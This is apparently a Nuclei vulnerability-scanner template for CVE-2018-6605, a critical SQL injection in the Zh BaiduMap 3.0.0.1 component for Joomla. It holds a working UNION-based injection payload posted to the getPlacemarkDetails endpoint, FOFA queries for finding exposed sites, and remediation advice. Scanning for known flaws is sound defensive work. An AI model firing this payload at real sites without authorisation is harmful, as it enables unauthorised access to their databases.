http:
- body: id=-1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - part: body
    type: word
    words:
    - '{{md5(num)}}'
    - dataexists
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails'
id: CVE-2018-6605
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:zh_baidumap_project:zh_baidumap:3.0.0.1:*:*:*:*:joomla\!:*:*
    cve-id: CVE-2018-6605
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99599
    epss-score: 0.90822
  description: 'SQL Injection exists in the Zh BaiduMap 3.0.0.1 component for Joomla!
    via the id parameter in a getPlacemarkDetails, getPlacemarkHoverText, getPathHoverText,
    or getPathDetails request.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL commands to access,
    modify, or delete database contents, potentially compromising the entire Joomla
    installation.

    '
  metadata:
    fofa-query:
    - "app=\"Joomla!-\u7F51\u7AD9\u5B89\u88C5\""
    - "app=\"joomla!-\u7F51\u7AD9\u5B89\u88C5\""
    framework: joomla\!
    max-request: 1
    product: zh_baidumap
    vendor: zh_baidumap_project
  name: Joomla! Component Zh BaiduMap 3.0.0.1 - SQL Injection
  reference:
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/C0reL0ader/EaST/blob/master/exploits/efa_joomla_zh_baidumap_sqli.py
  - https://www.exploit-db.com/exploits/43974
  remediation: 'Remove the vulnerable Zh BaiduMap component or upgrade to a patched
    version.

    '
  severity: critical
  tags: cve,cve2018,joomla,sqli,joomla\!,zh_baidumap_project,vkev,vuln
variables:
  num: '{{rand_int(2000000000, 2100000000)}}'
